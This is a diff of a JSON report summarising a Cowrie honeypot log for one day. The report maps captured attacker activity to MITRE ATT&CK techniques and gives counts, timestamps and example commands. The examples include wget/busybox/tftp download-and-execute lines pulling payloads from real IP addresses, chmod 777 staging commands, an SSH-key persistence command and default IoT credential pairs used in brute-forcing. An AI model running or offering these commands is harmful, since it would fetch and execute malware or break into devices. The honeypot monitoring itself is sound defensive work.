@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-19 18:01:45",
+  "generated": "2026-08-19 19:04:12",
   "totals": {
-    "commands": 5149,
-    "login_failed": 4122,
-    "login_success": 1547,
-    "sessions": 4348
+    "commands": 5196,
+    "login_failed": 4768,
+    "login_success": 1562,
+    "sessions": 4996
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4122,
+      "count": 4768,
       "examples": [
         "root / vizxv",
         "root / 19801021",
@@ -21,14 +21,14 @@
         "root / 19820308"
       ],
       "first": "2026-08-19T00:00:00.138204Z",
-      "last": "2026-08-19T18:01:30.819098Z",
-      "unique_ips": 92
+      "last": "2026-08-19T19:04:11.769148Z",
+      "unique_ips": 98
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1547,
+      "count": 1562,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "hikvision / hikvision",
@@ -37,14 +37,14 @@
         "telnetadmin / telnetadmin"
       ],
       "first": "2026-08-19T00:00:00.538972Z",
-      "last": "2026-08-19T17:55:48.735661Z",
-      "unique_ips": 65
+      "last": "2026-08-19T19:03:46.667680Z",
+      "unique_ips": 71
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 159,
+      "count": 162,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-19T00:55:54.512846Z",
-      "last": "2026-08-19T17:57:36.222047Z",
-      "unique_ips": 15
+      "last": "2026-08-19T18:56:31.836264Z",
+      "unique_ips": 17
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 96,
+      "count": 102,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,14 +69,14 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T17:57:36.222047Z",
-      "unique_ips": 14
+      "last": "2026-08-19T19:04:05.462630Z",
+      "unique_ips": 16
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 17,
+      "count": 19,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
@@ -85,8 +85,8 @@
         "uname -s -m"
       ],
       "first": "2026-08-19T01:22:46.787305Z",
-      "last": "2026-08-19T17:01:55.597319Z",
-      "unique_ips": 12
+      "last": "2026-08-19T18:10:43.585666Z",
+      "unique_ips": 14
     },
     {
       "id": "T1033",
@@ -166,6 +166,18 @@
       "unique_ips": 1
     },
     {
+      "id": "T1098.004",
+      "name": "Account Manipulation: SSH Authorized Keys",
+      "tactic": "Persistence",
+      "count": 1,
+      "examples": [
+        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt"
+      ],
+      "first": "2026-08-19T18:02:30.330342Z",
+      "last": "2026-08-19T18:02:30.330342Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1562.004",
       "name": "Impair Defenses: Disable or Modify System Firewall",
       "tactic": "Defense Evasion",
@@ -181,15 +193,15 @@
   "unmapped": [
     [
       "shell",
-      1498
+      1500
     ],
     [
       "sh",
-      1497
+      1499
     ],
     [
       "system",
-      1480
+      1482
     ],
     [
       "/bin/busybox",
@@ -197,7 +209,7 @@
     ],
     [
       "enable",
-      28
+      30
     ],
     [
       "linuxshell",
